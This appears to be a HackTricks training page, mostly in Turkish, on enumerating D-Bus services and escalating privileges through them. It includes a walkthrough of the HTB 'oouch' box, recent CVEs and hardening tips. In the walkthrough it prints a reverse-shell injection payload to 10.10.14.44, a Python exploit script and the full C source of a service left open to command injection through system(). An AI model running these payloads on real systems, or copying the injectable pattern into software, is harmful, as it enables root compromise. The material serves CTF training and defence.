# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus, Ubuntu masaüstü ortamlarında süreçler arası iletişim (IPC) aracısı olarak kullanılır. Ubuntu'da birden fazla message bus'ın eş zamanlı olarak çalıştığı görülür: öncelikli olarak **ayrıcalıklı servisler tarafından sistem genelinde ilgili servisleri sunmak için kullanılan** system bus ve oturum açmış her kullanıcı için yalnızca o kullanıcıya özel servisleri sunan bir session bus. Buradaki odak, ayrıcalıkları yükseltmek hedeflendiğinden, daha yüksek ayrıcalıklarla (ör. root) çalışan servislerle ilişkili olması nedeniyle öncelikle system bus üzerindedir. D-Bus mimarisinin her session bus için bir 'router' kullandığı; bu router'ın, istemcilerin iletişim kurmak istedikleri servis için belirttiği adrese göre istemci mesajlarını uygun servislere yönlendirmekten sorumlu olduğu belirtilmelidir.<sup>[[1]](#references)</sup>

D-Bus üzerindeki servisler, sundukları **objects** ve **interfaces** ile tanımlanır. Objects, standart OOP dillerindeki sınıf örneklerine benzetilebilir ve her örnek benzersiz bir **object path** ile tanımlanır. Bir filesystem path'e benzeyen bu path, servis tarafından sunulan her object'i benzersiz şekilde tanımlar. Araştırma açısından önemli bir interface, tek bir Introspect metoduna sahip olan **org.freedesktop.DBus.Introspectable** interface'idir. Bu method, object'in desteklediği method'ların, signal'ların ve property'lerin XML gösterimini döndürür; burada properties ve signals hariç method'lara odaklanılmaktadır.

D-Bus interface'i ile iletişim kurmak için iki tool kullanılmıştır: script'lerde D-Bus tarafından sunulan method'ların kolayca çağrılmasını sağlayan gdbus adlı bir CLI tool'u ve her bus üzerinde bulunan servisleri enumerate etmek ve her servis içindeki object'leri görüntülemek için tasarlanmış, Python tabanlı bir GUI tool'u olan [**D-Feet**](https://wiki.gnome.org/Apps/DFeet).
```bash
sudo apt-get install d-feet
```
**session bus**'ı kontrol ediyorsanız, önce mevcut adresi doğrulayın:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

İlk görüntüde, D-Bus system bus ile kayıtlı services gösterilmektedir. System Bus düğmesi seçildikten sonra özellikle **org.debin.apt** vurgulanmıştır. D-Feet, bu service'e object'ler için sorgu göndererek ikinci görüntüde görüldüğü üzere seçilen object'lere ait interface'leri, method'ları, property'leri ve signal'ları görüntüler. Her method'un signature'ı da ayrıntılı olarak gösterilir.

Dikkate değer bir özellik, service'in **process ID (pid)** ve **command line** bilgilerinin görüntülenmesidir. Bu bilgiler, service'in elevated privileges ile çalışıp çalışmadığını doğrulamak için kullanışlıdır ve araştırmanın ilgililiği açısından önemlidir.

**D-Feet ayrıca method invocation işlemine de izin verir**: kullanıcılar parametre olarak Python ifadeleri girebilir; D-Feet bunları service'e göndermeden önce D-Bus type'larına dönüştürür.

Ancak bazı method'ların invocation işlemine izin vermeden önce authentication gerektirdiğini unutmayın. Hedefimiz zaten credentials olmadan privileges yükseltmek olduğundan bu method'ları göz ardı edeceğiz.

Ayrıca bazı service'lerin, bir kullanıcının belirli actions gerçekleştirmesine izin verilip verilmeyeceğini öğrenmek için org.freedeskto.PolicyKit1 adlı başka bir D-Bus service'ini sorguladığını unutmayın.

## **Cmd line Enumeration**

### List Service Objects

Açılmış D-Bus interface'lerini şu şekilde listelemek mümkündür:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
**`(activatable)`** ile işaretlenmiş Services özellikle ilgi çekicidir; çünkü **henüz çalışmıyorlardır**, ancak bir bus request bunları gerektiğinde başlatabilir. `busctl list` komutuyla yetinmeyin; bu adları çalıştıracakları gerçek binary'lerle eşleştirin.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Bu, hangi `Exec=` yolunun bir activatable name için başlatılacağını ve hangi identity altında çalışacağını hızlıca gösterir. Binary veya yürütme zinciri zayıf şekilde korunuyorsa, inactive bir service yine de privilege-escalation yolu hâline gelebilir.

#### Bağlantılar

[Wikipedia'dan:](https://en.wikipedia.org/wiki/D-Bus) Bir process bir bus'a bağlantı kurduğunda, bus bu bağlantıya _unique connection name_ adı verilen özel bir bus name atar. Bu tür bus name'ler değiştirilemez; bağlantı var olduğu sürece değişmeyecekleri garanti edilir ve daha da önemlisi, bus'ın ömrü boyunca yeniden kullanılamazlar. Bu, aynı process bus bağlantısını kapatıp yeni bir bağlantı oluştursa bile, o bus üzerindeki başka hiçbir bağlantının bu unique connection name'i almayacağı anlamına gelir. Unique connection name'ler, aksi durumda yasak olan iki nokta karakteriyle başlamaları sayesinde kolayca tanınır.<sup>[[4]](#references)</sup>

### Service Object Bilgileri

Ardından, interface hakkında şu komutla bazı bilgiler edinebilirsiniz:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Ayrıca bus adını `systemd` unit'i ve çalıştırılabilir dosya yoluyla ilişkilendirin:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Bu, privesc sırasında önemli olan operasyonel soruyu yanıtlar: **bir method call başarılı olursa, işlemi hangi gerçek binary ve unit gerçekleştirecek?**

### Bir Service Object'in Interface'lerini Listeleme

Yeterli izinlere sahip olmanız gerekir.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Bir Service Object'in Introspect Interface'i

Bu örnekte, `tree` parametresi kullanılarak keşfedilen en son interface'in seçildiğine dikkat edin (_önceki bölüme bakın_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
`htb.oouch.Block` interface'inin (ilgilendiğimiz interface) `.Block` method'una dikkat edin. Diğer sütunlardaki "s" harfi, bir string beklediğini gösterebilir.

Tehlikeli bir şey denemeden önce, **read-oriented** veya başka şekilde düşük riskli bir method'u doğrulayın. Bu, üç durumu net biçimde birbirinden ayırır: yanlış syntax, erişilebilir ancak izin verilmemiş veya erişilebilir ve izin verilmiş.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus Methods ile Policies ve Actions'ı İlişkilendirme

Introspection size **neyi** çağırabileceğinizi gösterir, ancak bir çağrının **neden** izin verildiğini veya reddedildiğini göstermez. Gerçek privesc triage işlemi için genellikle **üç katmanı birlikte** incelemeniz gerekir:

1. **Activation metadata** (`.service` dosyaları veya `SystemdService=`): Gerçekte hangi binary'nin ve unit'in çalıştırılacağını öğrenmek için.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`): Kimlerin `own`, `send_destination` veya `receive_sender` kullanabileceğini öğrenmek için.
3. **Polkit action dosyaları** (`/usr/share/polkit-1/actions/*.policy`): Varsayılan authorization modelini (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`) öğrenmek için.

Yararlı komutlar:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Do **not** assume a 1:1 mapping between a D-Bus method and a Polkit action. Aynı method, değiştirilen object'e veya runtime context'e bağlı olarak farklı bir action seçebilir. Bu nedenle pratik workflow şöyledir:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` ve ilgili `.policy` dosyalarında grep
3. `busctl call`, `gdbus call` veya `dbusmap --enable-probes --null-agent` ile düşük riskli canlı probe'lar

Proxy veya compatibility servisleri özel ilgi gerektirir. İstekleri kendi önceden oluşturulmuş bağlantısı üzerinden başka bir D-Bus servisine ileten **root olarak çalışan bir proxy**, original caller identity yeniden doğrulanmadığı takdirde backend'in her isteği UID 0'dan geliyormuş gibi değerlendirmesine istemeden neden olabilir.<sup>[[3]](#references)</sup>

### Monitor/Capture Interface

Yeterli privilege ile (yalnızca `send_destination` ve `receive_sender` privilege'ları yeterli değildir) bir **D-Bus communication'ı monitor edebilirsiniz**.

Bir **communication'ı monitor etmek** için **root** olmanız gerekir. Root olduğunuz halde hâlâ sorun yaşıyorsanız [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) ve [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) sayfalarını kontrol edin.

> [!WARNING]
> Bir D-Bus config file'ını **non-root kullanıcıların** communication'ı **sniff etmesine izin verecek** şekilde nasıl yapılandıracağınızı biliyorsanız lütfen **benimle iletişime geçin**!

Monitor etmenin farklı yolları:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Aşağıdaki örnekte `htb.oouch.Block` arayüzü izlenir ve **"**_**lalalalal**_**" mesajı miscommunication aracılığıyla gönderilir**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Sonuçları Wireshark'ın açabileceği bir **pcapng** dosyasına kaydetmek için `monitor` yerine `capture` kullanabilirsiniz:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Tüm gürültüyü filtreleme <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Bus üzerinde çok fazla bilgi varsa, aşağıdaki gibi bir match rule iletin:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Birden fazla kural belirtilebilir. Bir mesaj kurallardan _herhangi biriyle_ eşleşirse mesaj yazdırılır. Şöyle:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Daha fazla bilgi için [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) içindeki match rule syntax bölümüne bakın.<sup>[[7]](#references)</sup>

### Daha fazlası

`busctl` daha da fazla seçeneğe sahiptir; [**tümünü burada bulabilirsiniz**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Güvenlik Açığı İçeren Senaryo**

HTB'deki "oouch" host'unda **qtc kullanıcısı** olarak _/etc/dbus-1/system.d/htb.oouch.Block.conf_ konumunda **beklenmeyen bir D-Bus config file** bulabilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Önceki yapılandırmadan, bu D-BUS iletişimi üzerinden bilgi gönderip almak için **`root` veya `www-data` kullanıcısı olmanız gerektiğini** unutmayın.

Docker container içinde **qtc** kullanıcısı olarak **aeb4525789d8**, _/code/oouch/routes.py_ dosyasında dbus ile ilgili bazı kodlar bulabilirsiniz. İlginç kod şu:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Gördüğünüz gibi, bir **D-Bus interface'ine bağlanıyor** ve **"Block" function'ına** "client_ip" değerini gönderiyor.

D-Bus connection'ın diğer tarafında çalışan, C ile derlenmiş bir binary bulunuyor. Bu kod, D-Bus connection'ı **IP address için dinliyor ve verilen IP address'i block etmek amacıyla `system` function'ı üzerinden iptables'ı çağırıyor**.\
`system` çağrısı kasıtlı olarak **command injection'a karşı vulnerable** durumda; bu nedenle aşağıdaki gibi bir payload reverse shell oluşturacaktır: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Bu sayfanın sonunda **D-Bus application'ın complete C code**'unu bulabilirsiniz. İçinde, 91-97. satırlar arasında **`D-Bus object path`** ile **`interface name`**'in nasıl **register edildiğini** görebilirsiniz. Bu bilgiler, D-Bus connection'a bilgi göndermek için gerekli olacaktır:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Ayrıca, 57. satırda bu D-Bus iletişimi için **kayıtlı olan tek methodun** `Block` olarak adlandırıldığını görebilirsiniz(_**Bu nedenle aşağıdaki bölümde payload'lar `htb.oouch.Block` servis nesnesine, `/htb/oouch/Block` arayüzüne ve `Block` method adına gönderilecektir**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Aşağıdaki python kodu, payload'u `block_iface.Block(runme)` aracılığıyla D-Bus bağlantısındaki `Block` method'una gönderecektir (_önceki kod parçasından çıkarıldığını unutmayın_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl ve dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send`, “Message Bus”e mesaj göndermek için kullanılan bir araçtır.
- Message Bus – Sistemlerin uygulamalar arasındaki iletişimi kolaylaştırmak için kullandığı bir yazılımdır. Message Queue ile ilişkilidir (mesajlar sıralı olarak düzenlenir); ancak Message Bus’ta mesajlar bir subscription modeliyle ve oldukça hızlı şekilde gönderilir.
- “-system” etiketi, bunun bir session mesajı değil, system mesajı olduğunu belirtmek için kullanılır (varsayılan olarak).
- “–print-reply” etiketi, mesajımızı uygun şekilde yazdırmak ve yanıtları insan tarafından okunabilir bir formatta almak için kullanılır.
- “–dest=Dbus-Interface-Block” Dbus interface’inin adresidir.
- “–string:” – Interface’e göndermek istediğimiz mesajın türüdür. double, bytes, booleans, int ve objpath gibi çeşitli mesaj gönderme biçimleri vardır. Bunlar arasından “object path”, bir dosyanın path’ini Dbus interface’ine göndermek istediğimizde kullanışlıdır. Bu durumda, bir dosyanın adıyla interface’e command göndermek için özel bir dosya (FIFO) kullanabiliriz. “string:;” – FIFO reverse shell dosyasını/command’ını yerleştirdiğimiz object path’i yeniden çağırmak içindir.

`htb.oouch.Block.Block` içinde ilk kısım (`htb.oouch.Block`) service object’i, son kısım (`.Block`) ise method adını belirtir.

### C kodu
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

Büyük bir D-Bus attack surface'inin `busctl`/`gdbus` ile manuel enumeration işlemi kısa sürede zahmetli hâle gelir. Son birkaç yılda yayımlanan iki küçük FOSS utility, red-team veya CTF çalışmalarında işleri hızlandırabilir:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* C ile yazılmıştır; her object path'i gezen, `Introspect` XML'ini alan ve bunu sahip PID/UID ile eşleştiren tek bir static binary'dir (<50 kB).<sup>[[5]](#references)</sup>
* Useful flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Tool, korumasız well-known name'leri `!` ile işaretler ve böylece *own* (take over) edebileceğiniz service'leri veya unprivileged shell'den erişilebilen method call'larını anında ortaya çıkarır.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Systemd unit'lerinde **writable** path'leri ve aşırı permissive D-Bus policy file'larını (ör. `send_destination="*"`) arayan yalnızca Python ile yazılmış bir script'tir.<sup>[[6]](#references)</sup>
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module aşağıdaki directory'leri arar ve normal bir user tarafından spoof edilebilen veya hijack edilebilen service'leri vurgular:
* `/etc/dbus-1/system.d/` ve `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

Yakın zamanda yayımlanan CVE'leri takip etmek, custom code içindeki benzer insecure pattern'leri tespit etmeye yardımcı olur. İki iyi güncel örnek şunlardır:<sup>[[2]](#references)[[3]](#references)</sup>

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Root olarak çalışan service, unprivileged user'ların yeniden yapılandırabileceği bir D-Bus interface'i açığa çıkardı; buna attacker-controlled macro davranışının yüklenmesi de dahildi. | System bus üzerinde **device/profile/config management** açığa çıkaran bir daemon varsa, writable configuration ve macro feature'larını yalnızca "settings" olarak değil, code-execution primitive'leri olarak değerlendirin. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Root olarak çalışan bir compatibility proxy, original caller'ın security context'ini korumadan backend service'lere request forward etti; bu nedenle backend'ler proxy'ye UID 0 olarak güvendi. | **Proxy / bridge / compatibility** D-Bus service'lerini ayrı bir bug class olarak değerlendirin: privileged call'ları relay ediyorlarsa caller UID/Polkit context'inin backend'e nasıl ulaştığını doğrulayın. |

Dikkat edilmesi gereken pattern'ler:
1. Service, **system bus üzerinde root olarak** çalışır.
2. Ya **authorization check yoktur** ya da check **yanlış subject** üzerinde gerçekleştirilir.
3. Erişilebilen method sonunda system state'i değiştirir: package install, user/group değişiklikleri, bootloader config, device profile güncellemeleri, file write'ları veya doğrudan command execution.

Bir method'a erişilip erişilemediğini doğrulamak için `dbusmap --enable-probes` veya manuel `busctl call` kullanın; ardından hangi **subject**'in gerçekten authorize edildiğini anlamak için service'in policy XML'ini ve Polkit action'larını inceleyin.

---

## Hardening & Detection Quick-Wins

* World-writable veya *send/receive*-open policy'leri arayın:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Dangerous method'lar için Polkit gerektirin – *root* proxy'ler bile kendi PID'leri yerine **caller** PID'sini `polkit_authority_check_authorization_sync()` işlevine geçirmelidir.
* Long-running helper'larda privileges'ı düşürün (bus'a bağlandıktan sonra namespace'leri değiştirmek için `sd_pid_get_owner_uid()` kullanın).
* Bir service'i kaldıramıyorsanız, en azından onu dedicated bir Unix group ile *scope* edin ve XML policy içinde erişimi kısıtlayın.
* Blue-team: anomaly detection için system bus'ı `busctl capture > /var/log/dbus_$(date +%F).pcapng` ile kaydedin ve Wireshark'a import edin.

---

## References

- [1] [USBCreator D-Bus Privilege Escalation in Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service allows configuration by any unprivileged user](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Authentication Bypass in Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)

{{#include ../../banners/hacktricks-training.md}}
